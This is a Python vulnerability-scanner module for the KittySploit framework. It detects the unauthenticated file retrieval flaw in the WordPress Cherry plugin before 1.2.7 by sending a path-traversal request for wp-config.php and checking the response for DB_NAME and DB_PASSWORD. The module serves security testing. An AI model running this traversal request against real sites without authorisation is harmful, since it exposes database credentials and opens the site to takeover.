#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress plugin Cherry < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload Detection',
        'description': 'WordPress plugin Cherry < 1.2.7 contains an unauthenticated file upload and download vulnerability, allowing attackers to upload and download arbitrary files. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'lfi', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/90034817-dee7-40c9-80a2-1f1cd1d033ee',
            'https://github.com/CherryFramework/cherry-plugin',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload detected",
                path='/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
            )
            return True
        return False

